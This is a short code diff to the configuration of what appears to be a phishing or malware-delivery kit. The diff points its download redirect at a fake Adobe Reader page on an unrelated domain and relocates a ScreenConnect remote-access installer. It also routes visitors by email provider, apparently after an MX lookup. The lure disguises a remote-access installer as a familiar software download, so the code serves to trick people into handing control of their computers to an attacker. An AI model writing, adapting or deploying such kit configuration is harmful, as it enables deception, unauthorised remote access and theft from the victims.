@@ -3,13 +3,13 @@ import dns from "dns/promises";
 /* ================= CONFIG ================= */
 
 const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
-  "https://verbalthinker.com/dialpad/download.html";
+  "https://marcenarias.net/adobe/reader/download.html";
 
-const MSI_PATH = "/ScreenConnect.ClientSetup.msi";
+const MSI_PATH = "/iteem/ScreenConnect.ClientSetup.msi";
 
-const OFFICE_TARGET = "https://agripeace.org/cws";
-const GOOGLE_TARGET = "https://agripeace.org/cws";
-const DEFAULT_TARGET = "https://agripeace.org/cws";
+const OFFICE_TARGET = "https://adobe.com";
+const GOOGLE_TARGET = "https://adobe.com";
+const DEFAULT_TARGET = "https://adobe.com";
 
 const MX_TIMEOUT_MS = 1500;
 
